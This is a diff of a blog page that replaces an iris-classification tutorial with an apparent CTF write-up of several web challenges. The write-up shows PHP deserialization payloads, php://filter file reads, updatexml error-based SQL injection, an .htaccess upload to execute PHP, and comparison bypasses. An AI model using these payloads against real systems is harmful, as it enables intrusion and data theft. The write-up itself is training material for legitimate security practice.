@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="人工智能之线性回归-鸢尾花模型, Y1ng0&#39;s blog">
+    <meta name="keywords" content="web小计-2, Y1ng0&#39;s blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>人工智能之线性回归-鸢尾花模型 | Y1ng0&#39;s blog</title>
+    <title>web小计-2 | Y1ng0&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -222,12 +222,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">人工智能之线性回归-鸢尾花模型</h1>
+                    <h1 class="description center-align post-title">web小计-2</h1>
                 </div>
             </div>
         </div>
@@ -351,8 +351,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/python/" class="post-category">
-                                python
+                            <a href="/categories/ctf/" class="post-category">
+                                ctf
                             </a>
                         
                     </div>
@@ -364,7 +364,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-04-15
+                    2021-04-16
                 </div>
                 
 
@@ -385,266 +385,74 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="二、鸢尾花分类"><a href="#二、鸢尾花分类" class="headerlink" title="二、鸢尾花分类"></a>二、鸢尾花分类</h1><p>数据集：</p>
-<ol>
-<li>sepla length 萼片长度</li>
-<li>sepla width 萼片宽度</li>
-<li>petal length 花瓣长度</li>
-<li>petal width 花瓣宽度</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> sklearn <span class="keyword">as</span> ak</span><br></pre></td></tr></table></figure>
+                <h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p><img src="/medias/pictures/1618446433959.png"></p>
+<p>审计代码,传递了三个参数:</p>
+<h5 id="text"><a href="#text" class="headerlink" title="$text"></a>$text</h5><p>读入text</p>
+<p><code>利用data协议: data://text/plain,welcome to the zjctf</code></p>
+<p>或<code>利用php伪协议:input:php://input</code></p>
+<p><img src="/medias/pictures/1618446586771.png"></p>
+<h5 id="file"><a href="#file" class="headerlink" title="$file"></a>$file</h5><p>preg_match()正则过滤flag</p>
+<p>读取file</p>
+<p><code>利用php伪协议:file=php://fileter/read=convert.base64-encode/resource=useless</code></p>
+<p><img src="/medias/pictures/1618446722706.png"></p>
+<p>base64转换:</p>
+<p><img src="/medias/pictures/1618446743818.png"></p>
+<h5 id="password"><a href="#password" class="headerlink" title="$password"></a>$password</h5><p>调用Flag,传递参数<code>$this-&gt;file=flag.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $a = new class Flag();</span><br><span class="line">   <span class="variable">$a</span>-&gt;file = <span class="string">&quot;filag.php&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p><img src="/medias/pictures/1618447770905.png"></p>
+<h5 id="构建payload"><a href="#构建payload" class="headerlink" title="构建payload"></a>构建payload</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?</span><br><span class="line">text=data:<span class="comment">//text/plain,welcome to the zjctf&amp;</span></span><br><span class="line">file=useless.php&amp;</span><br><span class="line">password=O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"></span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line"><span class="comment">#数据对象中包含的内容，通过keys()打印出来</span></span><br><span class="line"><span class="built_in">print</span>(iris.keys())</span><br></pre></td></tr></table></figure>
+<p><code>hint:构建最后的payload时,注意将前面file的php伪协议去除</code></p>
+<p><img src="/medias/pictures/1618447861119.png"></p>
+<p>得到flag:</p>
+<p><img src="/medias/pictures/1618447991057.png"></p>
+<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>过滤很多东西,尝试后,发现可以报错注入:</p>
+<h5 id="爆database"><a href="#爆database" class="headerlink" title="爆database()"></a>爆database()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;c4d7832b-f5b6-4279-86f3-7733e039a837.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&#39;or(updatexml(1,concat(0x23,database()),1))%23&amp;password&#x3D;21</span><br></pre></td></tr></table></figure>
 
-<pre><code>dict_keys([&#39;data&#39;, &#39;target&#39;, &#39;frame&#39;, &#39;target_names&#39;, &#39;DESCR&#39;, &#39;feature_names&#39;, &#39;filename&#39;])
-</code></pre>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#全部打印，，看看类型</span></span><br><span class="line"><span class="built_in">print</span>(iris.data)</span><br><span class="line"><span class="built_in">print</span>(iris.target)</span><br><span class="line"><span class="built_in">print</span>(iris.frame)</span><br><span class="line"><span class="built_in">print</span>(iris.target_names)</span><br><span class="line"><span class="built_in">print</span>(iris.DESCR)</span><br><span class="line"><span class="built_in">print</span>(iris.feature_names)</span><br><span class="line"><span class="built_in">print</span>(iris.filename)</span><br></pre></td></tr></table></figure>
+<h5 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h5><h5 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h5><h5 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h5><h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p><img src="/medias/pictures/1618531772117.png"></p>
+<p>代码审计</p>
+<h5 id="is-valid-函数限制只能出现ascii值在32-125之间的字符"><a href="#is-valid-函数限制只能出现ascii值在32-125之间的字符" class="headerlink" title="is_valid() :函数限制只能出现ascii值在32-125之间的字符"></a>is_valid() :函数限制只能出现ascii值在32-125之间的字符</h5><p>但前面定义为protected类型,导致序列化出现的%00标识被url解码后ascii值为0</p>
+<p>可以用<code>public</code>进行序列化(不会出现不可见字符)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<pre><code>[[5.1 3.5 1.4 0.2]
- [4.9 3.  1.4 0.2]
- [4.7 3.2 1.3 0.2]
- [4.6 3.1 1.5 0.2]
- [5.  3.6 1.4 0.2]
- [5.4 3.9 1.7 0.4]
- [4.6 3.4 1.4 0.3]
- [5.  3.4 1.5 0.2]
- [4.4 2.9 1.4 0.2]
- [4.9 3.1 1.5 0.1]
- [5.4 3.7 1.5 0.2]
- [4.8 3.4 1.6 0.2]
- [4.8 3.  1.4 0.1]
- [4.3 3.  1.1 0.1]
- [5.8 4.  1.2 0.2]
- [5.7 4.4 1.5 0.4]
- [5.4 3.9 1.3 0.4]
- [5.1 3.5 1.4 0.3]
- [5.7 3.8 1.7 0.3]
- [5.1 3.8 1.5 0.3]
- [5.4 3.4 1.7 0.2]
- [5.1 3.7 1.5 0.4]
- [4.6 3.6 1.  0.2]
- [5.1 3.3 1.7 0.5]
- [4.8 3.4 1.9 0.2]
- [5.  3.  1.6 0.2]
- [5.  3.4 1.6 0.4]
- [5.2 3.5 1.5 0.2]
- [5.2 3.4 1.4 0.2]
- [4.7 3.2 1.6 0.2]
- [4.8 3.1 1.6 0.2]
- [5.4 3.4 1.5 0.4]
- [5.2 4.1 1.5 0.1]
- [5.5 4.2 1.4 0.2]
- [4.9 3.1 1.5 0.2]
- [5.  3.2 1.2 0.2]
- [5.5 3.5 1.3 0.2]
- [4.9 3.6 1.4 0.1]
- [4.4 3.  1.3 0.2]
- [5.1 3.4 1.5 0.2]
- [5.  3.5 1.3 0.3]
- [4.5 2.3 1.3 0.3]
- [4.4 3.2 1.3 0.2]
- [5.  3.5 1.6 0.6]
- [5.1 3.8 1.9 0.4]
- [4.8 3.  1.4 0.3]
- [5.1 3.8 1.6 0.2]
- [4.6 3.2 1.4 0.2]
- [5.3 3.7 1.5 0.2]
- [5.  3.3 1.4 0.2]
- [7.  3.2 4.7 1.4]
- [6.4 3.2 4.5 1.5]
- [6.9 3.1 4.9 1.5]
- [5.5 2.3 4.  1.3]
- [6.5 2.8 4.6 1.5]
- [5.7 2.8 4.5 1.3]
- [6.3 3.3 4.7 1.6]
- [4.9 2.4 3.3 1. ]
- [6.6 2.9 4.6 1.3]
- [5.2 2.7 3.9 1.4]
- [5.  2.  3.5 1. ]
- [5.9 3.  4.2 1.5]
- [6.  2.2 4.  1. ]
- [6.1 2.9 4.7 1.4]
- [5.6 2.9 3.6 1.3]
- [6.7 3.1 4.4 1.4]
- [5.6 3.  4.5 1.5]
- [5.8 2.7 4.1 1. ]
- [6.2 2.2 4.5 1.5]
- [5.6 2.5 3.9 1.1]
- [5.9 3.2 4.8 1.8]
- [6.1 2.8 4.  1.3]
- [6.3 2.5 4.9 1.5]
- [6.1 2.8 4.7 1.2]
- [6.4 2.9 4.3 1.3]
- [6.6 3.  4.4 1.4]
- [6.8 2.8 4.8 1.4]
- [6.7 3.  5.  1.7]
- [6.  2.9 4.5 1.5]
- [5.7 2.6 3.5 1. ]
- [5.5 2.4 3.8 1.1]
- [5.5 2.4 3.7 1. ]
- [5.8 2.7 3.9 1.2]
- [6.  2.7 5.1 1.6]
- [5.4 3.  4.5 1.5]
- [6.  3.4 4.5 1.6]
- [6.7 3.1 4.7 1.5]
- [6.3 2.3 4.4 1.3]
- [5.6 3.  4.1 1.3]
- [5.5 2.5 4.  1.3]
- [5.5 2.6 4.4 1.2]
- [6.1 3.  4.6 1.4]
- [5.8 2.6 4.  1.2]
- [5.  2.3 3.3 1. ]
- [5.6 2.7 4.2 1.3]
- [5.7 3.  4.2 1.2]
- [5.7 2.9 4.2 1.3]
- [6.2 2.9 4.3 1.3]
- [5.1 2.5 3.  1.1]
- [5.7 2.8 4.1 1.3]
- [6.3 3.3 6.  2.5]
- [5.8 2.7 5.1 1.9]
- [7.1 3.  5.9 2.1]
- [6.3 2.9 5.6 1.8]
- [6.5 3.  5.8 2.2]
- [7.6 3.  6.6 2.1]
- [4.9 2.5 4.5 1.7]
- [7.3 2.9 6.3 1.8]
- [6.7 2.5 5.8 1.8]
- [7.2 3.6 6.1 2.5]
- [6.5 3.2 5.1 2. ]
- [6.4 2.7 5.3 1.9]
- [6.8 3.  5.5 2.1]
- [5.7 2.5 5.  2. ]
- [5.8 2.8 5.1 2.4]
- [6.4 3.2 5.3 2.3]
- [6.5 3.  5.5 1.8]
- [7.7 3.8 6.7 2.2]
- [7.7 2.6 6.9 2.3]
- [6.  2.2 5.  1.5]
- [6.9 3.2 5.7 2.3]
- [5.6 2.8 4.9 2. ]
- [7.7 2.8 6.7 2. ]
- [6.3 2.7 4.9 1.8]
- [6.7 3.3 5.7 2.1]
- [7.2 3.2 6.  1.8]
- [6.2 2.8 4.8 1.8]
- [6.1 3.  4.9 1.8]
- [6.4 2.8 5.6 2.1]
- [7.2 3.  5.8 1.6]
- [7.4 2.8 6.1 1.9]
- [7.9 3.8 6.4 2. ]
- [6.4 2.8 5.6 2.2]
- [6.3 2.8 5.1 1.5]
- [6.1 2.6 5.6 1.4]
- [7.7 3.  6.1 2.3]
- [6.3 3.4 5.6 2.4]
- [6.4 3.1 5.5 1.8]
- [6.  3.  4.8 1.8]
- [6.9 3.1 5.4 2.1]
- [6.7 3.1 5.6 2.4]
- [6.9 3.1 5.1 2.3]
- [5.8 2.7 5.1 1.9]
- [6.8 3.2 5.9 2.3]
- [6.7 3.3 5.7 2.5]
- [6.7 3.  5.2 2.3]
- [6.3 2.5 5.  1.9]
- [6.5 3.  5.2 2. ]
- [6.2 3.4 5.4 2.3]
- [5.9 3.  5.1 1.8]]
-[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
- 0 0 0 0 0 0 0 0 0 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1
- 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 2
- 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2
- 2 2]
-None
-[&#39;setosa&#39; &#39;versicolor&#39; &#39;virginica&#39;]
-.. _iris_dataset:
+<p>具体的三个参数值,继续审计代码</p>
+<h5 id="op"><a href="#op" class="headerlink" title="$op"></a>$op</h5><p><img src="/medias/pictures/1618533389072.png"></p>
+<p>在process()中,我们需要执行read()这个函数,因为是弱类型比较,所以$op == ‘2’</p>
+<p>在_destruct()中,强类型比较,$op===’2’时,$ $op=’1’</p>
+<p>所以<code>绕过process()中的弱类型比较</code></p>
+<p><code>$op==2</code></p>
+<h5 id="filename"><a href="#filename" class="headerlink" title="$filename"></a>$filename</h5><p>直接使用<code>php伪协议</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
 
-Iris plants dataset
---------------------
+<h5 id="构建payload-1"><a href="#构建payload-1" class="headerlink" title="构建payload"></a>构建payload</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;i:<span class="number">2</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">57</span>:<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-**Data Set Characteristics:**
+<p><img src="/medias/pictures/1618534209868.png"></p>
+<h5 id=""><a href="#" class="headerlink" title=""></a></h5><p><img src="/medias/pictures/1618534468068.png"></p>
+<h5 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密"></a>base64解密</h5><p><img src="/medias/pictures/1618534541431.png"></p>
+<h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>文件上传,后缀改为.jpg</p>
+<p><img src="/medias/pictures/1618536259431.png"></p>
+<p>执行静态文件:  </p>
+<p>上传.htaccess文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php   <span class="comment">#将上传的文件按php格式执行</span></span><br></pre></td></tr></table></figure>
 
-    :Number of Instances: 150 (50 in each of three classes)
-    :Number of Attributes: 4 numeric, predictive attributes and the class
-    :Attribute Information:
-        - sepal length in cm
-        - sepal width in cm
-        - petal length in cm
-        - petal width in cm
-        - class:
-                - Iris-Setosa
-                - Iris-Versicolour
-                - Iris-Virginica
-                
-    :Summary Statistics:
+<p><img src="/medias/pictures/1618536409728.png"></p>
+<p>得到flag</p>
+<p><img src="/medias/pictures/1618538358922.png"></p>
+<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p><img src="/medias/pictures/1618554283329.png"></p>
+<p>审计代码:</p>
+<h5 id="MD5比较"><a href="#MD5比较" class="headerlink" title="MD5比较"></a>MD5比较</h5><p>把传参变为数组</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$gg</span>[]=<span class="number">1</span>&amp;<span class="variable">$id</span>[]=<span class="number">2</span></span><br></pre></td></tr></table></figure>
 
-    ============== ==== ==== ======= ===== ====================
-                    Min  Max   Mean    SD   Class Correlation
-    ============== ==== ==== ======= ===== ====================
-    sepal length:   4.3  7.9   5.84   0.83    0.7826
-    sepal width:    2.0  4.4   3.05   0.43   -0.4194
-    petal length:   1.0  6.9   3.76   1.76    0.9490  (high!)
-    petal width:    0.1  2.5   1.20   0.76    0.9565  (high!)
-    ============== ==== ==== ======= ===== ====================
+<h5 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h5><p>字符串弱等于整形</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$passwd</span> = <span class="number">1234567</span>a</span><br></pre></td></tr></table></figure>
 
-    :Missing Attribute Values: None
-    :Class Distribution: 33.3% for each of 3 classes.
-    :Creator: R.A. Fisher
-    :Donor: Michael Marshall (MARSHALL%PLU@io.arc.nasa.gov)
-    :Date: July, 1988
-
-The famous Iris database, first used by Sir R.A. Fisher. The dataset is taken
-from Fisher&#39;s paper. Note that it&#39;s the same as in R, but not as in the UCI
-Machine Learning Repository, which has two wrong data points.
-
-This is perhaps the best known database to be found in the
-pattern recognition literature.  Fisher&#39;s paper is a classic in the field and
-is referenced frequently to this day.  (See Duda &amp; Hart, for example.)  The
-data set contains 3 classes of 50 instances each, where each class refers to a
-type of iris plant.  One class is linearly separable from the other 2; the
-latter are NOT linearly separable from each other.
-
-.. topic:: References
-
-   - Fisher, R.A. &quot;The use of multiple measurements in taxonomic problems&quot;
-     Annual Eugenics, 7, Part II, 179-188 (1936); also in &quot;Contributions to
-     Mathematical Statistics&quot; (John Wiley, NY, 1950).
-   - Duda, R.O., &amp; Hart, P.E. (1973) Pattern Classification and Scene Analysis.
-     (Q327.D83) John Wiley &amp; Sons.  ISBN 0-471-22361-1.  See page 218.
-   - Dasarathy, B.V. (1980) &quot;Nosing Around the Neighborhood: A New System
-     Structure and Classification Rule for Recognition in Partially Exposed
-     Environments&quot;.  IEEE Transactions on Pattern Analysis and Machine
-     Intelligence, Vol. PAMI-2, No. 1, 67-71.
-   - Gates, G.W. (1972) &quot;The Reduced Nearest Neighbor Rule&quot;.  IEEE Transactions
-     on Information Theory, May 1972, 431-433.
-   - See also: 1988 MLC Proceedings, 54-64.  Cheeseman et al&quot;s AUTOCLASS II
-     conceptual clustering system finds 3 classes in the data.
-   - Many, many more ...
-[&#39;sepal length (cm)&#39;, &#39;sepal width (cm)&#39;, &#39;petal length (cm)&#39;, &#39;petal width (cm)&#39;]
-E:\anaconda\lib\site-packages\sklearn\datasets\data\iris.csv
-</code></pre>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">x_features = iris.data</span><br><span class="line">y_target = iris.target</span><br><span class="line"></span><br><span class="line"><span class="comment">#先考虑sepla length,petal length两个特征值，位于x_features的第一列和第三列</span></span><br><span class="line"></span><br><span class="line">plt.scatter(x_features[<span class="number">0</span>:<span class="number">50</span>,<span class="number">0</span>],x_features[<span class="number">0</span>:<span class="number">50</span>,<span class="number">2</span>],color = <span class="string">&#x27;blue&#x27;</span>,marker = <span class="string">&#x27;x&#x27;</span>,label = <span class="string">&#x27;setosa&#x27;</span>)</span><br><span class="line">plt.scatter(x_features[<span class="number">50</span>:<span class="number">100</span>,<span class="number">0</span>],x_features[<span class="number">50</span>:<span class="number">100</span>,<span class="number">2</span>],color = <span class="string">&#x27;red&#x27;</span>,marker = <span class="string">&#x27;o&#x27;</span>,label = <span class="string">&#x27;versicolor&#x27;</span>)</span><br><span class="line">plt.scatter(x_features[<span class="number">100</span>:<span class="number">150</span>,<span class="number">0</span>],x_features[<span class="number">100</span>:<span class="number">150</span>,<span class="number">2</span>],color = <span class="string">&#x27;green&#x27;</span>,marker = <span class="string">&#x27;*&#x27;</span>,label = <span class="string">&#x27;virginica&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.xlabel(<span class="string">&#x27;sepal length (cm)&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;petal length (cm)&quot;</span>)</span><br><span class="line">plt.legend(loc = <span class="string">&#x27;upper left&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="output_5_0.png" alt="png"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用KNN算法按K=10的参数进行模型训练</span></span><br><span class="line"></span><br><span class="line">knn = KNeighborsClassifier(n_neighbors=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">knn.fit(x_features[:,::<span class="number">2</span>],y_target)  <span class="comment">#切出数据中的第一列和第三列</span></span><br><span class="line"></span><br><span class="line">x_test_features = np.array([[<span class="number">3.1</span>,<span class="number">8</span>]])</span><br><span class="line">y_judge_class = knn.predict(x_test_features)</span><br><span class="line"><span class="built_in">print</span>(y_judge_class)</span><br><span class="line"><span class="built_in">print</span>(iris.target_names)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the specified features iris is:&quot;</span>,iris.target_names[y_judge_class[<span class="number">0</span>]])</span><br></pre></td></tr></table></figure>
-
-<pre><code>[2]
-[&#39;setosa&#39; &#39;versicolor&#39; &#39;virginica&#39;]
-the specified features iris is: virginica
-</code></pre>
-<p>使用完整的四列特征按k=20进行训练<br>测量到一朵鸢尾花的四个特征分别是1.3cm，3.4cm，1.6cm，5.1cm</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用KNN算法按K=20的参数进行模型训练</span></span><br><span class="line"></span><br><span class="line">knn = KNeighborsClassifier(n_neighbors=<span class="number">20</span>)</span><br><span class="line">knn.fit(x_features,y_target)</span><br><span class="line"></span><br><span class="line">x_test_lab = np.array([[<span class="number">1.3</span>,<span class="number">3.4</span>,<span class="number">1.6</span>,<span class="number">5.1</span>]])</span><br><span class="line">y_judge_class = knn.predict(x_test_lab)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the specified features iris is:&quot;</span>,iris.target_names[y_judge_class[<span class="number">0</span>]])</span><br></pre></td></tr></table></figure>
-
-<pre><code>the specified features iris is: setosa
-</code></pre>
-<p>使用逻辑算法</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> metrics</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line"></span><br><span class="line">LR = LogisticRegression(multi_class=<span class="string">&#x27;multinomial&#x27;</span>,solver=<span class="string">&#x27;lbfgs&#x27;</span>,max_iter=<span class="number">1000</span>)</span><br><span class="line">LR.fit(x_features, y_target)</span><br><span class="line"></span><br><span class="line">y_predict_class = LR.predict(x_test_lab)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The specified features iris is by LR:&quot;</span>, iris.target_names[y_predict_class[<span class="number">0</span>]])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<pre><code>The specified features iris is by LR: setosa
-</code></pre>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h5><p><img src="/medias/pictures/1618554624020.png"></p>
+<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>堆叠注入:</p>
+<h5 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h5><p><img src="/medias/pictures/1618559053852.png"></p>
+<h5 id="爆字段-因为过滤很多使用handler"><a href="#爆字段-因为过滤很多使用handler" class="headerlink" title="爆字段(因为过滤很多使用handler)"></a>爆字段(因为过滤很多使用handler)</h5><p><img src="/medias/pictures/1618559263931.png"></p>
+<p>得到flag</p>
+<p><img src="/medias/pictures/1618559409222.png"></p>
 
                 
             </div>
@@ -671,7 +479,7 @@ the specified features iris is: virginica
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/04/15/4-15%20%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/">http://example.com/2021/04/15/4-15%20%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/</a>
+                    <a href="http://example.com/2021/04/16/web%E5%B0%8F%E8%AE%B0-2/">http://example.com/2021/04/16/web%E5%B0%8F%E8%AE%B0-2/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -878,9 +686,10 @@ the specified features iris is: virginica
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
                 <a href="/2021/04/16/web%E5%B0%8F%E8%AE%B0-2/">
